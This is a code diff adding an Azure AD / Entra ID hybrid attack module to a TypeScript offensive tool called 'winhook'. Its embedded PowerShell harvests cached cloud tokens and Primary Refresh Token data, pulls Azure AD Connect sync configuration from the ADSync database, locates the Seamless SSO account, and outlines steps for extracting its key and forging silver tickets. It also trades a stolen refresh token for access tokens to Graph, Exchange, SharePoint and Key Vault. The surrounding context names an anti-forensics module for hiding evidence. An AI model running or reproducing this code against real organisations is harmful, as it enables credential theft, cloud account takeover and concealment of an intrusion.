@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  azure_ad_hybrid: {
+    description:
+      "Azure AD / Entra ID hybrid attack toolkit — extract Primary Refresh Tokens (PRT) for cloud session hijacking, dump Azure AD Connect credentials (sync account password hash), extract Seamless SSO Kerberos decryption key (AZUREADSSOACC$ computer account), enumerate hybrid join status, tenant info, and conditional access gaps. Critical for on-prem to cloud lateral movement in hybrid environments",
+    args: "--action enum|prt|connect-creds|sso-key|token [--tenant TENANT] [--refresh-token TOKEN]",
+  },
   responder_poison: {
     description:
       "LLMNR/NBT-NS/mDNS poisoning — capture NTLMv2 hashes by responding to broadcast name resolution requests on the local network. Enumerate current poisoning opportunity (LLMNR/NBT-NS enabled status), start listener for hash capture, analyze captured hashes (identify accounts, services, crackable types). The foundational red team technique for credential capture on internal networks",
@@ -17635,6 +17640,413 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function azureAdHybrid(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const tenant = argVal(args, "--tenant")
+  const refreshToken = argVal(args, "--refresh-token")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure AD / Entra ID hybrid attack toolkit...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Azure AD Hybrid Environment Enumeration ==="
+Write-Output ""
+# Check Azure AD join status
+Write-Output "--- Device Join Status ---"
+$dsregOutput = dsregcmd /status 2>&1
+$joinType = if ($dsregOutput -match 'AzureAdJoined\s*:\s*YES') { "Azure AD Joined" }
+  elseif ($dsregOutput -match 'DomainJoined\s*:\s*YES' -and $dsregOutput -match 'AzureAdJoined\s*:\s*YES') { "Hybrid Joined" }
+  elseif ($dsregOutput -match 'DomainJoined\s*:\s*YES') { "Domain Joined Only" }
+  else { "Workgroup" }
+Write-Output "Join Type: $joinType"
+# Extract tenant info
+$tenantName = ($dsregOutput | Select-String 'TenantName\s*:\s*(.+)').Matches.Groups[1].Value
+$tenantId = ($dsregOutput | Select-String 'TenantId\s*:\s*(.+)').Matches.Groups[1].Value
+$deviceId = ($dsregOutput | Select-String 'DeviceId\s*:\s*(.+)').Matches.Groups[1].Value
+Write-Output "Tenant: $tenantName"
+Write-Output "Tenant ID: $tenantId"
+Write-Output "Device ID: $deviceId"
+# PRT status
+$prtStatus = ($dsregOutput | Select-String 'AzureAdPrt\s*:\s*(.+)').Matches.Groups[1].Value
+$prtUpdate = ($dsregOutput | Select-String 'AzureAdPrtUpdateTime\s*:\s*(.+)').Matches.Groups[1].Value
+Write-Output ""
+Write-Output "--- PRT Status ---"
+Write-Output "Has PRT: $prtStatus"
+Write-Output "PRT Update: $prtUpdate"
+if ($prtStatus -eq 'YES') {
+  Write-Output "STATUS: PRT available — cloud session hijacking possible"
+  Write-Output "Use: winhook azure_ad_hybrid --action prt"
+}
+# Check for Azure AD Connect
+Write-Output ""
+Write-Output "--- Azure AD Connect ---"
+$aadcService = Get-Service -Name 'ADSync' -ErrorAction SilentlyContinue
+if ($aadcService) {
+  Write-Output "Azure AD Connect: INSTALLED (Service: $($aadcService.Status))"
+  $aadcPath = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Azure AD Connect" -ErrorAction SilentlyContinue).InstallPath
+  Write-Output "Install Path: $aadcPath"
+  Write-Output "STATUS: Credential extraction possible — use --action connect-creds"
+} else {
+  Write-Output "Azure AD Connect: Not installed on this host"
+  # Check if AZUREADSSOACC$ exists (Seamless SSO)
+  try {
+    $ssoAccount = ([adsisearcher]"(sAMAccountName=AZUREADSSOACC$)").FindOne()
+    if ($ssoAccount) {
+      Write-Output ""
+      Write-Output "--- Seamless SSO ---"
+      Write-Output "AZUREADSSOACC$ computer account FOUND"
+      Write-Output "STATUS: Seamless SSO key extraction possible — use --action sso-key"
+    }
+  } catch {}
+}
+# Check for managed identities / service principals
+Write-Output ""
+Write-Output "--- Cloud Credentials on Host ---"
+$tokenPaths = @(
+  "$env:USERPROFILE\\.azure\\accessTokens.json",
+  "$env:USERPROFILE\\.azure\\azureProfile.json",
+  "$env:USERPROFILE\\.azure\\msal_token_cache.json",
+  "$env:LOCALAPPDATA\\Microsoft\\TokenBroker\\Cache"
+)
+foreach ($p in $tokenPaths) {
+  if (Test-Path $p) {
+    Write-Output "  FOUND: $p"
+  }
+}
+# Check for Az PowerShell module tokens
+$azContext = "$env:USERPROFILE\\.Azure\\AzureRmContext.json"
+if (Test-Path $azContext) {
+  Write-Output "  FOUND: Az module context — $azContext"
+  $ctx = Get-Content $azContext | ConvertFrom-Json -ErrorAction SilentlyContinue
+  if ($ctx) {
+    Write-Output "  Cached accounts: $($ctx.Contexts.PSObject.Properties.Count)"
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("PRT available")) {
+      findings.push({
+        checkId: "AZURE-001",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "Azure AD PRT",
+        title: "Primary Refresh Token available for cloud session hijacking",
+        details: "Device has active PRT — can be extracted for Azure AD/M365 access without credentials",
+        remediation: "Enable Credential Guard, enforce device compliance policies.",
+      })
+    }
+    if (r.stdout.includes("Azure AD Connect: INSTALLED")) {
+      findings.push({
+        checkId: "AZURE-002",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "Azure AD Connect",
+        title: "Azure AD Connect installed — sync account credential extraction possible",
+        details: "AAD Connect sync account has DCSync rights and cloud admin privileges",
+        remediation: "Restrict admin access to the AAD Connect server, monitor for credential extraction.",
+      })
+    }
+    if (r.stdout.includes("AZUREADSSOACC$ computer account FOUND")) {
+      findings.push({
+        checkId: "AZURE-003",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: "AZUREADSSOACC$",
+        title: "Seamless SSO computer account found — Kerberos key extraction possible",
+        details: "AZUREADSSOACC$ password hash can forge Kerberos tickets for any Azure AD user",
+        remediation: "Rotate AZUREADSSOACC$ password regularly, monitor for DCSync of this account.",
+      })
+    }
+  }
+
+  if (action === "prt") {
+    const script = `
+Write-Output "=== Primary Refresh Token Extraction ==="
+Write-Output ""
+# Method 1: BrowserCore.exe (Chrome SSO extension hook)
+Write-Output "--- Method 1: BrowserCore.exe PRT Cookie ---"
+$bcPath = "$env:ProgramFiles\\Windows Security\\BrowserCore\\browsercore.exe"
+if (Test-Path $bcPath) {
+  Write-Output "BrowserCore found: $bcPath"
+  # Request PRT cookie via named pipe
+  $body = @{
+    method = "GetCookies"
+    uri = "https://login.microsoftonline.com/"
+    sender = "https://login.microsoftonline.com"
+  } | ConvertTo-Json
+  try {
+    $proc = Start-Process -FilePath $bcPath -NoNewWindow -PassThru -RedirectStandardInput stdin -RedirectStandardOutput stdout
+    Write-Output "BrowserCore invoked — PRT SSO cookie request sent"
+  } catch {
+    Write-Output "BrowserCore invocation failed: $_"
+  }
+} else {
+  Write-Output "BrowserCore not found at expected path"
+}
+
+# Method 2: Token Broker cache
+Write-Output ""
+Write-Output "--- Method 2: Token Broker Cache ---"
+$tbCache = "$env:LOCALAPPDATA\\Microsoft\\TokenBroker\\Cache"
+if (Test-Path $tbCache) {
+  $tbFiles = Get-ChildItem $tbCache -Filter "*.tbres" -ErrorAction SilentlyContinue
+  Write-Output "Token Broker cache files: $($tbFiles.Count)"
+  foreach ($f in $tbFiles) {
+    $content = [System.IO.File]::ReadAllBytes($f.FullName)
+    $text = [System.Text.Encoding]::UTF8.GetString($content)
+    if ($text -match '"access_token"' -or $text -match '"refresh_token"') {
+      Write-Output "  [+] Token found in: $($f.Name)"
+      if ($text -match '"displayName"\s*:\s*"([^"]+)"') { Write-Output "      Account: $($matches[1])" }
+    }
+  }
+} else {
+  Write-Output "Token Broker cache not found"
+}
+
+# Method 3: CloudAP PRT via dsregcmd
+Write-Output ""
+Write-Output "--- Method 3: dsregcmd PRT Status ---"
+$dsreg = dsregcmd /status 2>&1
+$prtLines = $dsreg | Select-String -Pattern 'AzureAdPrt|NgcSet|CloudTGT|RefreshToken'
+foreach ($l in $prtLines) { Write-Output "  $($l.Line.Trim())" }
+
+# Method 4: WAM tokens
+Write-Output ""
+Write-Output "--- Method 4: Web Account Manager (WAM) ---"
+$wamPath = "$env:LOCALAPPDATA\\Packages\\Microsoft.AAD.BrokerPlugin_*\\AC\\TokenBroker\\Accounts"
+$wamDirs = Get-Item $wamPath -ErrorAction SilentlyContinue
+if ($wamDirs) {
+  foreach ($d in $wamDirs) {
+    $files = Get-ChildItem $d -Recurse -ErrorAction SilentlyContinue
+    Write-Output "WAM account files: $($files.Count)"
+    foreach ($f in ($files | Select-Object -First 5)) {
+      Write-Output "  $($f.FullName)"
+    }
+  }
+}
+
+Write-Output ""
+Write-Output "--- Azure CLI / Az Module Tokens ---"
+$azTokenFile = "$env:USERPROFILE\\.azure\\msal_token_cache.json"
+if (Test-Path $azTokenFile) {
+  $tokens = Get-Content $azTokenFile | ConvertFrom-Json -ErrorAction SilentlyContinue
+  if ($tokens.AccessToken) {
+    Write-Output "[+] MSAL token cache found with $($tokens.AccessToken.PSObject.Properties.Count) access tokens"
+    foreach ($t in $tokens.AccessToken.PSObject.Properties) {
+      $tok = $t.Value
+      Write-Output "  Account: $($tok.username) | Resource: $($tok.resource) | Expires: $($tok.expires_on)"
+    }
+  }
+  if ($tokens.RefreshToken) {
+    Write-Output "[+] $($tokens.RefreshToken.PSObject.Properties.Count) refresh tokens available"
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("[+] Token found") || r.stdout.includes("[+] MSAL token cache")) {
+      findings.push({
+        checkId: "AZURE-004",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "Cloud Tokens",
+        title: "Azure AD tokens found — cloud access possible",
+        details: r.stdout.substring(0, 500),
+        remediation: "Enforce token protection, enable Credential Guard, monitor token usage.",
+      })
+    }
+  }
+
+  if (action === "connect-creds") {
+    const script = `
+Write-Output "=== Azure AD Connect Credential Extraction ==="
+Write-Output ""
+$aadcService = Get-Service -Name 'ADSync' -ErrorAction SilentlyContinue
+if (-not $aadcService) {
+  Write-Output "ERROR: Azure AD Connect is not installed on this host"
+  Write-Output "Find the AAD Connect server first: winhook ad_enum (look for MSOL_ accounts)"
+  return
+}
+# Method 1: ADSync database extraction
+Write-Output "--- Method 1: ADSync Database (LocalDB or SQL) ---"
+$dbConfig = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Azure AD Connect" -ErrorAction SilentlyContinue
+$sqlInstance = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server Local DB\\Installed Versions\\*" -ErrorAction SilentlyContinue)
+Write-Output "SQL Instance detected: $(if ($sqlInstance) {'LocalDB'} else {'Remote SQL'})"
+
+# Extract encrypted config from ADSync database
+$client = New-Object System.Data.SqlClient.SqlConnection
+$client.ConnectionString = "Server=np:\\\\.\\pipe\\Microsoft##WID\\tsql\\query;Database=ADSync;Trusted_Connection=true"
+try {
+  $client.Open()
+  $cmd = $client.CreateCommand()
+  $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE subtype = 'Windows Azure Active Directory (Microsoft)'"
+  $reader = $cmd.ExecuteReader()
+  if ($reader.Read()) {
+    $privateConfig = $reader.GetString(0)
+    $encryptedConfig = $reader.GetString(1)
+    Write-Output ""
+    Write-Output "[+] AAD Connect configuration extracted from ADSync database"
+    # Parse for sync account
+    if ($privateConfig -match '<forest-login-user>([^<]+)</forest-login-user>') {
+      Write-Output "  AD Sync Account: $($matches[1])"
+    }
+    if ($privateConfig -match '<forest-login-domain>([^<]+)</forest-login-domain>') {
+      Write-Output "  Domain: $($matches[1])"
+    }
+    Write-Output "  Encrypted config length: $($encryptedConfig.Length) chars"
+    Write-Output ""
+    Write-Output "Note: Decryption requires AADInternals or DPAPI key from the AAD Connect service account"
+    Write-Output "  Install-Module AADInternals; Get-AADIntSyncCredentials"
+  }
+  $reader.Close()
+  $client.Close()
+} catch {
+  Write-Output "Database query failed: $_"
+  Write-Output "Try: Install-Module AADInternals; Get-AADIntSyncCredentials"
+}
+
+# Method 2: Check for MSOL_ account in AD
+Write-Output ""
+Write-Output "--- Method 2: MSOL_ Sync Service Accounts ---"
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(sAMAccountName=MSOL_*)"
+$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","description","whenCreated","pwdLastSet"))
+$msolAccounts = $searcher.FindAll()
+if ($msolAccounts.Count -gt 0) {
+  foreach ($a in $msolAccounts) {
+    Write-Output "[+] MSOL Account: $($a.Properties['samaccountname'][0])"
+    Write-Output "    Description: $($a.Properties['description'][0])"
+    Write-Output "    Created: $($a.Properties['whencreated'][0])"
+    $pwdSet = [DateTime]::FromFileTime([Int64]$a.Properties['pwdlastset'][0])
+    Write-Output "    Password Set: $pwdSet"
+  }
+  Write-Output ""
+  Write-Output "MSOL_ accounts have DCSync rights (Replicating Directory Changes)"
+  Write-Output "If password is extracted, use: winhook dcsync --target krbtgt"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("[+] AAD Connect configuration extracted") || r.stdout.includes("[+] MSOL Account")) {
+      findings.push({
+        checkId: "AZURE-005",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "Azure AD Connect",
+        title: "AAD Connect sync credentials accessible",
+        details: r.stdout.substring(0, 500),
+        remediation: "Restrict access to AAD Connect server, use gMSA for sync account, monitor for DCSync.",
+      })
+    }
+  }
+
+  if (action === "sso-key") {
+    const script = `
+Write-Output "=== Seamless SSO Key Extraction ==="
+Write-Output ""
+Write-Output "Target: AZUREADSSOACC$ computer account"
+Write-Output "This account's password hash is the Kerberos decryption key for Azure AD SSO"
+Write-Output "With this key, you can forge Kerberos service tickets for any Azure AD user"
+Write-Output ""
+# Check if account exists
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(sAMAccountName=AZUREADSSOACC$)"
+$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","pwdLastSet","servicePrincipalName","whenCreated"))
+$ssoAccount = $searcher.FindOne()
+if (-not $ssoAccount) {
+  Write-Output "AZUREADSSOACC$ not found — Seamless SSO may not be configured"
+  return
+}
+$pwdSet = [DateTime]::FromFileTime([Int64]$ssoAccount.Properties['pwdlastset'][0])
+$daysSinceRotation = (New-TimeSpan -Start $pwdSet -End (Get-Date)).Days
+Write-Output "[+] AZUREADSSOACC$ found"
+Write-Output "    Created: $($ssoAccount.Properties['whencreated'][0])"
+Write-Output "    Password Set: $pwdSet ($daysSinceRotation days ago)"
+Write-Output "    SPNs: $($ssoAccount.Properties['serviceprincipalname'] -join ', ')"
+Write-Output ""
+if ($daysSinceRotation -gt 30) {
+  Write-Output "[!] Password has not been rotated in $daysSinceRotation days (recommended: 30 days)"
+}
+Write-Output "--- Extraction Methods ---"
+Write-Output "1. DCSync (if you have replication rights):"
+Write-Output "   winhook dcsync --target AZUREADSSOACC$"
+Write-Output ""
+Write-Output "2. NTDS.dit extraction:"
+Write-Output "   winhook ntds_dump"
+Write-Output "   Then extract AZUREADSSOACC$ hash from dump"
+Write-Output ""
+Write-Output "--- Silver Ticket Forgery ---"
+Write-Output "With the AZUREADSSOACC$ NTLM hash, forge tickets:"
+Write-Output "   winhook silver_ticket --service-hash <HASH> --spn HTTP/autologon.microsoftazuread-sso.com --domain <DOMAIN> --sid <SID>"
+Write-Output "This grants access to Azure AD as any synced user"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("[+] AZUREADSSOACC$ found")) {
+      const daysMatch = r.stdout.match(/(\d+) days ago/)
+      findings.push({
+        checkId: "AZURE-006",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "AZUREADSSOACC$",
+        title: `Seamless SSO key extractable (password age: ${daysMatch ? daysMatch[1] : "unknown"} days)`,
+        details: "AZUREADSSOACC$ computer account Kerberos key can forge Azure AD authentication tickets",
+        remediation: "Rotate AZUREADSSOACC$ password every 30 days, restrict DCSync permissions.",
+      })
+    }
+  }
+
+  if (action === "token") {
+    if (!refreshToken) {
+      output.push("ERROR: --refresh-token required for token action")
+      output.push("Extract refresh tokens first: winhook azure_ad_hybrid --action prt")
+      return { output: output.join("\n"), findings }
+    }
+    const tenantParam = tenant || "common"
+    const script = `
+Write-Output "=== Azure AD Token Exchange ==="
+Write-Output "Tenant: ${tenantParam}"
+Write-Output ""
+# Exchange refresh token for access tokens to various resources
+$resources = @(
+  @{Name="Microsoft Graph"; Id="https://graph.microsoft.com"},
+  @{Name="Azure Management"; Id="https://management.azure.com"},
+  @{Name="Office 365 Exchange"; Id="https://outlook.office365.com"},
+  @{Name="SharePoint"; Id="https://microsoft.sharepoint.com"},
+  @{Name="Azure Key Vault"; Id="https://vault.azure.net"}
+)
+foreach ($res in $resources) {
+  Write-Output "--- $($res.Name) ---"
+  try {
+    $body = @{
+      grant_type = "refresh_token"
+      refresh_token = '${refreshToken}'
+      client_id = "1b730954-1685-4b74-9bfd-dac224a7b894"
+      scope = "$($res.Id)/.default"
+    }
+    $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/${tenantParam}/oauth2/v2.0/token" -Method POST -Body $body
+    Write-Output "[+] Access token obtained for $($res.Name)"
+    Write-Output "    Expires: $([DateTimeOffset]::FromUnixTimeSeconds($response.expires_on).LocalDateTime)"
+    Write-Output "    Token: $($response.access_token.Substring(0, 50))..."
+  } catch {
+    Write-Output "[-] Failed: $($_.Exception.Message)"
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function responderPoison(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "check"
   const iface = argVal(args, "--interface")
@@ -22074,6 +22486,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   password_spray: passwordSpray,
   ntlm_relay: ntlmRelay,
   responder_poison: responderPoison,
+  azure_ad_hybrid: azureAdHybrid,
 }
 
 export const WinhookTool = Tool.define("winhook", {
